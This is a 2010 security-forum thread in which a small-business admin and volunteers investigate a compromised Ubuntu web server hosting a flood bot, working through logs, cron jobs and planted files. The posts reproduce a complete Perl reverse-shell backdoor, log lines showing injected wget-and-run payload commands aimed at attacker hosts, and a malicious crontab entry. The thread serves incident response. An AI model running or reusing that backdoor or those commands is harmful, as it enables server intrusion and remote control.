---
title: "Something is trnsmitting packets and grinding my network to a halt"
date: 2010-02-10
forum: Security
---

### Post by johnnyb123 on 2010-02-10
Help!  I think my Ubuntu server has been hacked and I don't know what to do!

I have a small network with 4 users, a Win2003 server for LAN/security functions, and a Dell Blade server running Ubuntu 8.04.1 which runs as our web server on port 80.  I manage the Ubuntu server with Webmin v1.42

Yesterday, my users weren't able to access the internet nor were they able to receive mail, etc. and no one could access any of the website hosted on the webserver.  However, the internal users could access each other's PCs and internal printers and devices - just nothing outside.

I began to troubleshoot: 
I could see a lot of activity on the Router/Firewall on the port connected to the Ubuntu server.  When I unplugged the server, everyone could immedately connect to the internet.  So, the problem was originating with that server.

When I logged in to the Ubuntu server using Webmin, I checked System>Running Processes and right at the top of the list was the process:
ID    Owner    CPU    Command
23184 www-data 98.1%  ./s 174.120.164.186 7777

When I drilled down on this process it said that the parent process was:
/bin/sh -c ./s 174.120.164.186 7777

I pressed the Trace Process button and it appears to be sending the following repeatedly:
Time      System Call    Parameters                  Return
xx:xx:xx  send           125,0123456789ABCDE,15,0    15

So, I manually Killed the process and added a rule to my firewall/router to block an IP range that includes 174:120:164:186

A few hours later the same process stars again in Ubuntu,, effectively plugging up my pipeline to the internet and preventing access to the websites being hosted.

It suspect that there is some kind of virus on my Ubuntu machine but have no idea how to locate and destroy it.  I am relatively new to the Ubuntu world and would appreciate anyone's help immensely!  I just don't know what to do!

Thank you in advance!
-John

---

### Post by cariboo on 2010-02-10
You probably have a root kit installed. Disconnect the server from the network. I would suggest you install rkhunter to see if it detects anything. The best you can do if you can't solve the problem is to do a re-install and restore the users file from your backups.

---

### Post by FuturePilot on 2010-02-10
If you take a look at that file you can probably see what it's doing since it looks like just a shell script. But that definitely sounds suspicious.

---

### Post by johnnyb123 on 2010-02-10
Thank you for the suggestion.  I installed and ran rkhunter and it responded with some warnings:

[20:43:46] Checking application versions...
[20:43:46] Info: Starting test name 'apps'
[20:43:46]   Checking version of Exim MTA                    [ Warning ]
[20:43:46] Warning: Application 'exim', version '4.69', is out of date, and possibly a security risk.
[20:43:47]   Checking version of GnuPG                       [ OK ]
[20:43:47] Info: Application 'gpg' version '1.4.6' found.
[20:43:47] Info: Application 'httpd' not found.
[20:43:47] Info: Application 'named' not found.
[20:43:47]   Checking version of OpenSSL                     [ Warning ]
[20:43:47] Warning: Application 'openssl', version '0.9.8g', is out of date, and possibly a security risk.
[20:43:47] Info: Application 'php' not found.
[20:43:47] Info: Application 'procmail' not found.
[20:43:47] Info: Application 'proftpd' not found.
[20:43:47]   Checking version of OpenSSH                     [ Warning ]
[20:43:47] Warning: Application 'sshd', version '4.7p1', is out of date, and possibly a security risk.
[20:43:47] Info: Applications checked: 4 out of 9

This is where I'm a complete newbie.  Should I upgrade these apps?  And if so, how do I go about doing this using Webmin?

Thank you cariboo907

---

### Post by johnnyb123 on 2010-02-10
> **FuturePilot said:**
> If you take a look at that file you can probably see what it's doing since it looks like just a shell script. But that definitely sounds suspicious.
Sorry to sound like a newbie but which file should I look at.  It appears like a command being run rather than a file.  I'm so new to this stuff.

Thank you FuturePilot

---

### Post by running_rabbit07 on 2010-02-10
Sounds like maybe someone's using this system for a denial of service attack. Maybe the Tribe Flood Network attack.

---

### Post by unspawn on 2010-02-11
> **johnnyb123 said:**
> I don't know what to do!
Best is to stay calm and *do nothing until you know what to do*. Reading usually helps form a plan. Start with [http://web.archive.org/web/20080109214340/http://www.cert.org/tech_tips/intruder_detection_checklist.html](http://web.archive.org/web/20080109214340/http://www.cert.org/tech_tips/intruder_detection_checklist.html) if you need some guiding steps. 

The facts as you presented them:
0. server running Ubuntu 8.04.1
- **8.04.4** is current AFAIK, any compelling reason for not having followed upgrades? Did you at least get all available updates?

1. which runs as our web server
- What **other services** does the machine provide?
- And did you also scan the **adjacent** machines (just in case)?

2. manage the Ubuntu server with Webmin v1.42 
- CVE says there's one XSS vulnerability in webmin below 1.500, any compelling reason for not having upgraded it?
- And is its URI accessible from the outside world?
- Do you perchance run any other management services accessible from the outside world?

3. manually Killed the process (..) A few hours later the same process stars again
- Killing processes like you did is not unusual behaviour (even well-seasoned admins fall for that trap) but unfortunately it destroys "evidence" making it slightly harder to get a grip on things. As for the purpose of the script tthe 174.120.164.186 IP plus 7777 port number points to a "Lineage2dreams" game server. The scripts owner (www-data) shows the infection vector likely has to do with your webserver. This could be something simple like misconfiguration, local or remote file inclusion.
- So what software does this webserver run? Think not just "PHP" but what it **provides** like SMF, phpBB2, awstats, Joomla, CMS modules. Please provide **exact version** nfo as well.
- Running 'lsof -Pwnp 23184' should show more details like where the script is run from. Try it on the new Process Id and post back details.
- The fact it returns could be explained if you can find a cronjob triggering it. Other possibilities are it being started from init (highly unlikely) or running its own "restarter" (unlikely as well).
- Check your $DOCROOT and tempdirs for any anomalous files: odd names, datestamps near the incident, odd ownership and access permissions.
- Check your logs (Logwatch?) for anomalies. Most of the time successful attacks are preceded by lots of recon.


Finally I agree you should disconnect the machine from the 'net while you're working on it. There are no valid reasons (no there aren't, really) for allowing LAN or outside world access to it. Before you do (if you didn't already) create yourself a list of process details: '( lsof -Pn; ps axfwwwe; netstat -anpe; last; who ) > /dev/shm/listing' and save it to another machine for later reference.


Any questions please ask, HTH.

---

### Post by johnnyb123 on 2010-02-11
> **unspawn said:**
> Best is to stay calm and *do nothing until you know what to do*. Reading usually helps form a plan. Start with [http://web.archive.org/web/20080109214340/http://www.cert.org/tech_tips/intruder_detection_checklist.html](http://web.archive.org/web/20080109214340/http://www.cert.org/tech_tips/intruder_detection_checklist.html) if you need some guiding steps. 

The facts as you presented them:
0. server running Ubuntu 8.04.1
- **8.04.4** is current AFAIK, any compelling reason for not having followed upgrades? Did you at least get all available updates?

1. which runs as our web server
- What **other services** does the machine provide?
- And did you also scan the **adjacent** machines (just in case)?

2. manage the Ubuntu server with Webmin v1.42 
- CVE says there's one XSS vulnerability in webmin below 1.500, any compelling reason for not having upgraded it?
- And is its URI accessible from the outside world?
- Do you perchance run any other management services accessible from the outside world?

3. manually Killed the process (..) A few hours later the same process stars again
- Killing processes like you did is not unusual behaviour (even well-seasoned admins fall for that trap) but unfortunately it destroys "evidence" making it slightly harder to get a grip on things. As for the purpose of the script tthe 174.120.164.186 IP plus 7777 port number points to a "Lineage2dreams" game server. The scripts owner (www-data) shows the infection vector likely has to do with your webserver. This could be something simple like misconfiguration, local or remote file inclusion.
- So what software does this webserver run? Think not just "PHP" but what it **provides** like SMF, phpBB2, awstats, Joomla, CMS modules. Please provide **exact version** nfo as well.
- Running 'lsof -Pwnp 23184' should show more details like where the script is run from. Try it on the new Process Id and post back details.
- The fact it returns could be explained if you can find a cronjob triggering it. Other possibilities are it being started from init (highly unlikely) or running its own "restarter" (unlikely as well).
- Check your $DOCROOT and tempdirs for any anomalous files: odd names, datestamps near the incident, odd ownership and access permissions.
- Check your logs (Logwatch?) for anomalies. Most of the time successful attacks are preceded by lots of recon.


Finally I agree you should disconnect the machine from the 'net while you're working on it. There are no valid reasons (no there aren't, really) for allowing LAN or outside world access to it. Before you do (if you didn't already) create yourself a list of process details: '( lsof -Pn; ps axfwwwe; netstat -anpe; last; who ) > /dev/shm/listing' and save it to another machine for later reference.


Any questions please ask, HTH.
Fantastic information, unspawn!  Thank you!

Your very first suggestion (after staying calm) yielded something significant.  I started with the "...webarchive.org...checklist.html link you provided and began to go through the steps.  

The first thing it recommended was to scan all log files.  Look for unusual activity in syslog.  I found the following started by root two days before the issues started.  There are no instances of it before this date:
Feb 5 06:25:01 ubuntu1 /USR/SBIN/CRON[18403]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))

Then when I executed one of the recommended commands: "find / -name ".. " -print -xdev", one line appeared : /var/tmp/../

In this directory was a folder named "..", containing :
- file "botdeflood.jpg" (which is not really a jpg file. It does not open so I suspect the hacker renames it at the time of execution into a usable file.)
- folder "fl"

Opening the folder "fl" displays a list of 25 files:
l
b
b2
bang.txt
elflood.seen
f
f4
fwd
httpd
j
j2
mech.help
mech.levels
mech.pid
mech.session
mech.set
s
sl
start.sh
std
stream
tty
v
v2
x

------------------------

Opening one of the files like "mech.session" displays:
linkport -1

nick elflood
login el
ircname i'll flood your ***
modes ix
cmdchar @
userfile 1

set BANMODES 6
tog CC 0
tog CLOAK 1
set AAWAY 1
tog NOIDLE 1
channel #alwaysyouandme
set MDL 4
set MBL 4
set MKL 4
tog **** 1
tog ENFM 1
set ENFM +nt

server tampa.fl.us.undernet.org 6667 
server zagreb.hr.eu.undernet.org 6667 
server diemen.nl.eu.undernet.org 6667 
server 208.83.20.130 6667 
server 161.53.178.240 6667 
server 194.109.20.90 6667 
-------------------------------

Opening "start.sh" displays:
/#bin/bash
PATH="."
httpd
echo "Enjoy FloodBot based on OverKill"
--------------------------------------

Definitely a hacker.  I absolutely don't know how to remove this trojan nor do I know how to block things like this from happening again.  
I should start by providing answers to the rest of your questions:

0a. 8.04.4 is current AFAIK, any compelling reason for not having followed upgrades...
 - not a great reason but I am near the end of a significant development project using MySQL on that server and I didn't want to risk delays due to upgrade issues. Plus I'm not really clear on how to do so - specifically upgrade to 8.04.4 and not 9xxx.

1a. What other services does the machine provide? 
 - aside from a webserver, it runs PHP, and MySQL 5.0.51, and SFTP.  
 
1b. And did you also scan the adjacent machines (just in case)?
 - yes, no viruses on other machines

2a. CVE says there's one XSS vulnerability in webmin below 1.500, any compelling reason for not having upgraded it?
 - again, not a great reason but I am near the end of a significant development project using MySQL on that server and I didn't want to risk delays due to upgrade issues.

2b. And is its URI accessible from the outside world?
 - Yes. Through a [https://..ip](https://..ip) address to a forwarded port.

2c. Do you perchance run any other management services accessible from the outside world?
 - Yes. I have SFTP open for the website owners to access and manage their websites directly.  They use Filezilla to do this.

3a. So what software does this webserver run?
 - webserver, it runs PHP, and MySQL 5.0.51, SSH Server OpenSSH_4.7, and standard SFTP.  Egads!  I just checked the SSH Server and it's set to ALLOW login by root = Yes.  I just changed to = No.  Is this how the hacker got in?

3b. Running 'lsof -Pwnp 23184' should show more details ...
 - unfortunately by killing the process, it erased its tracks.  This command produced nothing.

3c. Check your $DOCROOT and tempdirs for any anomalous files:...
 - BINGO.  This is where the ".." folder and hacker's files were placed.

3d. Check your logs (Logwatch?) for anomalies...
 - I checked through the Ubuntu server logs and my firewall logs and nothing jumped out at me.  My firewall blocks an outside request about every 10 seconds because of port and/or ip restrictions I have set.  Because I don't know the hacker's IP, I can't block it at the firewall.
 - I don't have Logwatch running because I haven't enabled the mail system in Ubuntu.  I just manually scan through the logs every other day to look for phrases like "break in attempt".


Questions:
1. Is there a way to trace the cron (or other) command that launches the programs stored in my tmp folder?

2. If I just delete these folders, will this at least stop it from re-launching?  Or will something recreate these files?

3. By setting the SSH Server Allow Login by root to No, will this stop the hacker from getting in to the server again?  Or does it just have too many vulnerabilities with what I'm running on it?

Again, HTH, THANK YOU VERY MUCH for your help with this!!  I appreciate it immensely.
-John

---

### Post by running_rabbit07 on 2010-02-11
> **johnnyb123 said:**
> Fantastic information, unspawn!  Thank you!

Your very first suggestion (after staying calm) yielded something significant.  I started with the "...webarchive.org...checklist.html link you provided and began to go through the steps.  

The first thing it recommended was to scan all log files.  Look for unusual activity in syslog.  I found the following started by root two days before the issues started.  There are no instances of it before this date:
Feb 5 06:25:01 ubuntu1 /USR/SBIN/CRON[18403]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))

Then when I executed one of the recommended commands: "find / -name ".. " -print -xdev", one line appeared : /var/tmp/../

In this directory was a folder named "..", containing :
- file "botdeflood.jpg" (which is not really a jpg file. It does not open so I suspect the hacker renames it at the time of execution into a usable file.)
- folder "fl"

Opening the folder "fl" displays a list of 25 files:
l
b
b2
bang.txt
[COLOR="Red"]elflood.seen[/COLOR]
f
f4
fwd
httpd
j
j2
mech.help
mech.levels
mech.pid
mech.session
mech.set
s
sl
start.sh
std
stream
tty
v
v2
x

------------------------

Opening one of the files like "mech.session" displays:
linkport -1

nick elflood
login el
[COLOR="red"]ircname i'll flood your ***[/COLOR]
modes ix
cmdchar @
userfile 1

set BANMODES 6
tog CC 0
tog CLOAK 1
set AAWAY 1
tog NOIDLE 1
channel #alwaysyouandme
set MDL 4
set MBL 4
set MKL 4
tog **** 1
tog ENFM 1
set ENFM +nt

server tampa.fl.us.undernet.org 6667 
server zagreb.hr.eu.undernet.org 6667 
server diemen.nl.eu.undernet.org 6667 
server 208.83.20.130 6667 
server 161.53.178.240 6667 
server 194.109.20.90 6667 
-------------------------------

Opening "start.sh" displays:
/#bin/bash
PATH="."
httpd
echo "[COLOR="red"]Enjoy FloodBot based on OverKill[/COLOR]"
--------------------------------------

Definitely a hacker.  I absolutely don't know how to remove this trojan nor do I know how to block things like this from happening again.  
I should start by providing answers to the rest of your questions:

0a. 8.04.4 is current AFAIK, any compelling reason for not having followed upgrades...
 - not a great reason but I am near the end of a significant development project using MySQL on that server and I didn't want to risk delays due to upgrade issues. Plus I'm not really clear on how to do so - specifically upgrade to 8.04.4 and not 9xxx.

1a. What other services does the machine provide? 
 - aside from a webserver, it runs PHP, and MySQL 5.0.51, and SFTP.  
 
1b. And did you also scan the adjacent machines (just in case)?
 - yes, no viruses on other machines

2a. CVE says there's one XSS vulnerability in webmin below 1.500, any compelling reason for not having upgraded it?
 - again, not a great reason but I am near the end of a significant development project using MySQL on that server and I didn't want to risk delays due to upgrade issues.

2b. And is its URI accessible from the outside world?
 - Yes. Through a [https://..ip](https://..ip) address to a forwarded port.

2c. Do you perchance run any other management services accessible from the outside world?
 - Yes. I have SFTP open for the website owners to access and manage their websites directly.  They use Filezilla to do this.

3a. So what software does this webserver run?
 - webserver, it runs PHP, and MySQL 5.0.51, SSH Server OpenSSH_4.7, and standard SFTP.  Egads!  I just checked the SSH Server and it's set to ALLOW login by root = Yes.  I just changed to = No.  Is this how the hacker got in?

3b. Running 'lsof -Pwnp 23184' should show more details ...
 - unfortunately by killing the process, it erased its tracks.  This command produced nothing.

3c. Check your $DOCROOT and tempdirs for any anomalous files:...
 - BINGO.  This is where the ".." folder and hacker's files were placed.

3d. Check your logs (Logwatch?) for anomalies...
 - I checked through the Ubuntu server logs and my firewall logs and nothing jumped out at me.  My firewall blocks an outside request about every 10 seconds because of port and/or ip restrictions I have set.  Because I don't know the hacker's IP, I can't block it at the firewall.
 - I don't have Logwatch running because I haven't enabled the mail system in Ubuntu.  I just manually scan through the logs every other day to look for phrases like "break in attempt".


Questions:
1. Is there a way to trace the cron (or other) command that launches the programs stored in my tmp folder?

2. If I just delete these folders, will this at least stop it from re-launching?  Or will something recreate these files?

3. By setting the SSH Server Allow Login by root to No, will this stop the hacker from getting in to the server again?  Or does it just have too many vulnerabilities with what I'm running on it?

Again, HTH, THANK YOU VERY MUCH for your help with this!!  I appreciate it immensely.
-John

You need to get that off of your machine. It is part of a Denial of Service attack. It is using your server to attack someone else's server and your server's NIC is efficient enough to flood your own network as well.

I am only a beginner in network intrusion detection, so at this point, I don't know how to tell you to remove this code, but until you do, it is going to cause problems. Also chances are that whoever inserted this code on your system, also has access to the other processes on the infected server.

---

### Post by unspawn on 2010-02-11
> **johnnyb123 said:**
> The first thing it recommended was to scan all log files.  Look for unusual activity in syslog. I found the following started by root two days before the issues started.  There are no instances of it before this date:
Feb 5 06:25:01 ubuntu1 /USR/SBIN/CRON[18403]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
A regular "cron" log entry AFAIK.


> **johnnyb123 said:**
> one line appeared : /var/tmp/../ In this directory was a folder named "..", containing :
- file "botdeflood.jpg" (which is not really a jpg file. It does not open so I suspect the hacker renames it at the time of execution into a usable file.)
Running 'file' on it should show it's an archive, usually some form of .tar.gz. The extension change is to make U/L and D/L easier and of course "hiding in plain sight". Who'd expect something malicious in something as innocuous as a JPEG file?...


> **johnnyb123 said:**
> Opening the folder "fl" displays a list of 25 files:
l b b2 bang.txt elflood.seen f f4 fwd httpd j j2 mech.help mech.levels mech.pid
mech.session mech.set s sl start.sh std stream tty v v2 x
Nice collection: an IRC bot, various scanners, maybe even a process hider. I'd like a copy of that if you don't mind. (Maybe you could copy it to a ticket in [http://sourceforge.net/tracker/?group_id=155034&atid=794188](http://sourceforge.net/tracker/?group_id=155034&atid=794188) please?) What's the "fl" dir and files ownership BTW?


> **johnnyb123 said:**
> Definitely a hacker. I absolutely don't know how to remove this trojan nor do I know how to block things like this from happening again.
It is not the removing part that's important now but determining how they got in. Location, directory and file ownership on downloaded and unpacked files can provide an indication.


> **johnnyb123 said:**
> 2c. Do you perchance run any other management services accessible from the outside world?
 - Yes. I have SFTP open for the website owners to access and manage their websites directly.  They use Filezilla to do this.
OK. (Let's forego speculation right now about untrustworthy or compromised remote clients.) What software is it that powers their websites? I don't mean "plain PHP" but the actual board or CMS software product name (if any). 


> **johnnyb123 said:**
> 3a. So what software does this webserver run?
 - webserver, it runs PHP, and MySQL 5.0.51, SSH Server OpenSSH_4.7, and standard SFTP.  Egads!  I just checked the SSH Server and it's set to ALLOW login by root = Yes.  I just changed to = No.  Is this how the hacker got in?
If she did then she was very wise to actually demote her processes to the www-data user ;-p If the root account was used then your logs (OpenSSH uses a syslog facility of "auth" by default so /etc/syslog.conf will tell where those messages go) and auth records ('last') should show, provided you do log things.


> **johnnyb123 said:**
> 3d. Check your logs (Logwatch?) for anomalies...
 - I checked through the Ubuntu server logs and my firewall logs and nothing jumped out at me.  My firewall blocks an outside request about every 10 seconds because of port and/or ip restrictions I have set.  Because I don't know the hacker's IP, I can't block it at the firewall.
 - I don't have Logwatch running because I haven't enabled the mail system in Ubuntu.  I just manually scan through the logs every other day to look for phrases like "break in attempt".
The point of using something like Logwatch is that it makes it harder to miss stuff and which makes it more efficient and faster for you to respond to (possible) incidents. It's also [easily extensible]("http://www.linuxquestions.org/blog/unspawn-2450/2009/10/3/logwatch-webserver-logs-php-malarky-2308/") if one finds stuff is missing. I recommend using it.


> **johnnyb123 said:**
> 1. Is there a way to trace the cron (or other) command that launches the programs stored in my tmp folder?
Like running jobs any editing of a users crontab is logged to /var/log/syslog by default. 
Kind of depends. You should inspect your (previously made) listing of all processes to see if there's any suspect ones (for instance if Apache is /usr/sbin/httpd, then "/usr/local/bin/apache -SSL" should make you twitch). If it's run from cron (big if) then if the cronjob wasn't dropped in any default dirs cron looks in like /etc/cron.d, /etc/cron.hourly, /etc/cron.daily et cetera, then check out the contents of /var/spool/cron/crontabs/. 


> **johnnyb123 said:**
> 2. If I just delete these folders, will this at least stop it from re-launching? Or will something recreate these files?
Highly unlikely an automated process will unarchive those files again.


> **johnnyb123 said:**
> 3. By setting the SSH Server Allow Login by root to No, will this stop the hacker from getting in to the server again?  Or does it just have too many vulnerabilities with what I'm running on it?
While it's tempting I'd rather not speculate but would like to aim for more facts to base advice on. 

BTW, to confirm, the machine is now inaccessible from the (any) network, right?

---

### Post by johnnyb123 on 2010-02-11
1. Maybe you could copy it to a ticket in [http://sourceforge.net/tracker/?grou...34&atid=794188](http://sourceforge.net/tracker/?grou...34&atid=794188) please?
 - ok. I'll definitely get these files to you.  I went to this link and it is not apparent to me how to upload these files.  All of the posts listed are closed.  I've never used this site before.  Also, I attempted to download the ".." folder to my laptop so I could upload it and it set off all of my anivirus alarm bells.  How do I get these to you?  Sorry.  I'm a bit of a newbie.

- the ".." folder and "fl" file owner is www-data.  Interesting.  There is now a new file in the /var/tmp directory called "dc.txt" user: www-data  group: [www.data](www.data).  In this file is the following code:

#!/usr/bin/perl
use Socket;
print "ZeuL's Connect Back Backdoor\n\n";
if (!$ARGV[0]) {
  printf "Usage: $0 [Host] <Port>\n";
  exit(1);
}
print "[*] Dumping Arguments\n";
$host = $ARGV[0];
$port = 80;
if ($ARGV[1]) {
  $port = $ARGV[1];
}
print "[*] Connecting...\n";
$proto = getprotobyname('tcp') || die("Unknown Protocol\n");
socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("Socket Error\n");
my $target = inet_aton($host);
if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
  die("Unable to Connect\n");
}
print "[*] Spawning Shell\n";
if (!fork( )) {
  open(STDIN,">&SERVER");
  open(STDOUT,">&SERVER");
  open(STDERR,">&SERVER");
  exec {'/bin/sh'} '-bash' . "\0" x 4;
  exit(0);
}
print "[*] Datached\n\n";


It looks like he/she placed a little backdoor script.
--------------------------

2. What software is it that powers their websites?
 - there are very simple websites with custom built html and php pages.  The php pages merely read text content from MySQL tables.  There are no programs to manage content except for a MySQL editor called Navicat which is loaded on the users PCs. 
------------------------

3. The point of using something like Logwatch ...
 - after this hacker is locked out, I will activate the mail system and enable Logwatch.

 - I had to plug the Ubuntu server in to get at some of these answers.  When I checked the running proceses and there were entries right up to this minute stating the one of the hackers files was being updated, user www-data, etc.  So, I just unplugged it from the network again.
I will leave this unplugged from the network until this is resolved.  I will notify my website customers that their sites will be down for an "undetermined amount of time".

I'm not sure if I've provided any useful information this time.

Thank you again HTH!

---

### Post by unspawn on 2010-02-12
> **johnnyb123 said:**
> 1. Maybe you could copy it to a ticket in [http://sourceforge.net/tracker/?grou...34&atid=794188](http://sourceforge.net/tracker/?grou...34&atid=794188) please?
 - ok. I'll definitely get these files to you.  I went to this link and it is not apparent to me how to upload these files.
Basically you create an account here: [http://sourceforge.net/account/registration/](http://sourceforge.net/account/registration/) before creating a ticket here: [http://sourceforge.net/tracker/?func=add&group_id=155034&atid=794188](http://sourceforge.net/tracker/?func=add&group_id=155034&atid=794188) and attach the archive.

 
> **johnnyb123 said:**
> Also, I attempted to download the ".." folder to my laptop so I could upload it and it set off all of my anivirus alarm bells.
It might still trigger any capable AV but chances of cross-infection are infinitesimal (asserting your laptop doesn't run GNU/Linux) and GNU/Linux (ELF) executables don't run on mcrsft (PE) anyway, so best compress it first: 'tar -cjf /dev/shm/files.tar.bz2 /path/to/files/'. If you want to avoid any AV triggering then you could RAR or Zip-compress files using a password as AVs won't deal with those types of archive.


> **johnnyb123 said:**
> - the ".." folder and "fl" file owner is www-data. 
Good! That still points to the web stack as entry (or at least execution) point. 


> **johnnyb123 said:**
> There is now a new file in the /var/tmp directory called "dc.txt" user: www-data  group: [www.data](www.data). (..) It looks like he/she placed a little backdoor script.
Indeed. If that file wasn't there before (provided you didn't delete it in the first place) then there's one of the reasons for keeping the machine isolated from the network. BTW backdoors like these are often downloaded from the 'net as-is, so if your webserver was used for it (else, does the www-data user have a shell history?) then Apache access log may show entry for it.


> **johnnyb123 said:**
> 2. What software is it that powers their websites?
 - there are very simple websites with custom built html and php pages.  The php pages merely read text content from MySQL tables.  There are no programs to manage content except for a MySQL editor called Navicat which is loaded on the users PCs.
OK. Maybe a bit a-typical a case, then. What I mean is that the majority of attackers these days are opportunists (nothing wrong with that itself) and will go for quick wins using ready-made exploits for example for phpBB, SMF, Joomla, CMS modules, Roundcube, PhpMyAdmin or awstats. Just to confirm: you don't run any of those, right? Did you look at all OpenSSH messages and 'last'? 
 

> **johnnyb123 said:**
> 3. The point of using something like Logwatch ...
 - after this hacker is locked out, I will activate the mail system and enable Logwatch.
OK, but what I mean is that by copying log files and using Logwatch *now* (maybe install it on another GNU/Linux machine?) it could make it easier to see what recon they tried and how they got in. For instance Apache access logs may for instance show 'cd%20', 'lynx%20' or 'wget%20' lines, helping you get a fix on the time of breach and pinpoint the acces method (e.g. URI to look at). If that doesn't do it for you then you'll have to grep the logs yourself since we need something to point to. Getting a fix on the time of breach is necessary because you can use that to find other files with similar timestamps but also to help (somewhat) assess integrity of backups you made (OK, if you *made* backups). Mind you, not that these backups should be used to restore the machine to a previous state but they can serve as reference point. Even without fix on the time you can use 'find / -xdev -user www-data -ls' to enumerate all files owned by that user and work out an approximate timeline from that.


> **johnnyb123 said:**
> - I had to plug the Ubuntu server in to get at some of these answers.  When I checked the running proceses and there were entries right up to this minute stating the one of the hackers files was being updated, user www-data, etc.  So, I just unplugged it from the network again. I will leave this unplugged from the network until this is resolved.  I will notify my website customers that their sites will be down for an "undetermined amount of time".
Good. Talking processes, did you generate the listing, trace all processes and visually inspect all cron dirs and user crontabs?


//BTW, HTH just means "hope this helps", it's not my handle.

---

### Post by johnnyb123 on 2010-02-12
Ah.  Sorry "unspawn" (not HTH).  Just another newbie mistake.
I've been scouring the Ubuntu server for the last 7 hours, following your advice, which I am extremely grateful for.

I have signed up for a sourceforge account and await their email confirmation.  Then I will upload the files for you.

Q. does the www-data user have a shell history?
A. None found.

Q. ...then Apache access log may show entry for it.
A. The hacker's uploaded files and folders have an associated date of Mon Feb 8, 2010 @ 09:07.  The Apache access.log does not contain records at or near this time.  In fact there is a 4 hour span around this time where there was no apparent activity.  2 hours before and 2 hours after.  This is odd because the rest of the records have no more than a 1 hour span between them.

Q. Just to confirm: you don't run any of those, right?
A. Right.  I do not run any of those programs.

Q.  Did you look at all OpenSSH messages and 'last'?
A.  I am unsure where to look for all OpenSSH messages.  I looked at the Logfile var/log/auth.log for entries on Feb 8 around 9:07 and, again, there seems to be a large number of records missing compared to other days.
Throughout the auth.log file, there are thousands of lines like:

Feb  6 06:53:47 ubuntu1 CRON[24128]: pam_unix(cron:session): session closed for user root
Feb  6 06:54:01 ubuntu1 CRON[24370]: pam_unix(cron:session): session opened for user www-data by (uid=0)
Feb  6 06:54:01 ubuntu1 CRON[24370]: pam_unix(cron:session): session closed for user www-data

A. In the /car/log/messages file, there are instances of a line containing "restart".  Example:
Feb  7 06:33:19 ubuntu1 syslogd 1.5.0#1ubuntu1: restart.
-
Note: I have not restarted ubuntu in months.  These entries always fall between 6:20 and 6:47 in the morning.  Definitely not done by me.

I'm not sure if this is significant or not.
--------

A. I found numerous lines in the Apache log like:
 - 92.63.130.117 - - [20/Jan/2010:09:13:57 -0500] "GET //phpmyadmin//config.inc.php?c=cd%20/var/tmp;%20wget%20bilssh.is-the-boss.com/dc.pl%20;%20perl%20dc.pl%20193.194.87.139%202753 HTTP/1.1" 200 11 "-" "Conf"
 - 92.63.130.117 - - [20/Jan/2010:09:14:17 -0500] "GET //phpmyadmin//config.inc.php?c=cd%20/var/tmp;%20wget%20bilssh.is-the-boss.com/dc.pl%20;%20perl%20dc.pl%20193.194.87.139%202753%20-vv HTTP/1.1" 200 11 "-" "Conf"
 - 92.63.130.117 - - [20/Jan/2010:09:14:33 -0500] "GET //phpmyadmin//config.inc.php?c=cd%20/var/tmp;%20wget%20bilssh.is-the-boss.com/dc.pl%20;%20perl%20dc.pl%20193.194.87.139%202753 HTTP/1.1" 200 11 "-" "Conf"
 - 85.119.93.14 - - [09/Feb/2010:20:24:05 -0500] "GET //phpmyadmin///config/config.inc.php?c=cd%20/tmp;%20wget%20http://god.whitehat.ro/perl%20-O%20/tmp/perl;perl%20/tmp/perl HTTP/1.1" 404 351 "-" "Conf"

Lots of 'wget%20'
 - 194.102.255.38 - - [20/Jan/2010:09:36:28 -0500] "GET //phpmyadmin///config/config.inc.php?c=wget%20http://cupidonclub.ro/80.txt%20-O%20/tmp/80.txt;perl%20/tmp/80.txt HTTP/1.1" 404 351 "-" "Conf"

This one appears after the suspected breach...
 - 85.214.28.252 - - [08/Feb/2010:11:38:28 -0500] "GET //phpmyadmin///config/config.inc.php?c=wget%20http://85.214.28.252/81.txt%20-O%20/tmp/81.txt;perl%20/tmp/81.txt HTTP/1.1" 404 351 "-" "Conf"

Q. OK, if you *made* backups...
A. Unfortunately, I just backed up the MySQL databases and Websites.  I did not back up any Ubuntu system or environment files.  I know. Webserver Management 101 stuff.

Q. ...you can use 'find / -xdev -user www-data -ls' to enumerate all files owned by that user ...
A. OK. I did this and now have a complete list of files with a large date span on the file creation date.  Feb 8th seems to be the time of breach.

Q. ...did you generate the listing, trace all processes and visually inspect all cron dirs and user crontabs?
A. There is a CRONTABS directory containing two files : "root" and "www-data".  The root file contains:

# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.9m0VZB/crontab installed on Wed Jul 16 12:20:21 2008)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
54 9 * * * /etc/webmin/cron/tempdelete.pl

It looks fairly benign, but who knows.

The "www-data" file contains :

# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (cron.d installed on Mon Feb  8 19:47:42 2010)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
* * * * * /var/tmp/bb/update >/dev/null 2>&1

Would I eventually be deleting these cron jobs from the Scheduled Cron Jobs list:

1.  root Yes /etc/webmin/cron/tempdelete.pl  
2.  www-data Yes /var/tmp/bb/update >/dev/null 2>&1 
...and possibly...
3.  root Yes [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ ...  

Do you think I am ready to weed out the selected "www-data" files and folders and cron jobs, then do the upgrades to Ubuntu 8.04.4 and Webmin 1.5 and put the server back on line again?

Thank you very much for your time and consideration, "unspawn"!

-John

---

### Post by mr-woof on 2010-02-12
Have you got any ideas on how they managed to get into your system yet?

---

### Post by unspawn on 2010-02-12
> **johnnyb123 said:**
> I will upload the files for you.
Thanks in advance!


> **johnnyb123 said:**
> Q. ...then Apache access log may show entry for it.
A. The hacker's uploaded files and folders have an associated date of Mon Feb 8, 2010 @ 09:07.  The Apache access.log does not contain records at or near this time.  In fact there is a 4 hour span around this time where there was no apparent activity.  2 hours before and 2 hours after.  This is odd because the rest of the records have no more than a 1 hour span between them.
Good find! Indeed odd, but changing Apaches logging would require root account rights. Can you correlate with your firewall and router logs there was absolutely no traffic during that period?


> **johnnyb123 said:**
> Q.  Did you look at all OpenSSH messages and 'last'?
A.  I am unsure where to look for all OpenSSH messages.
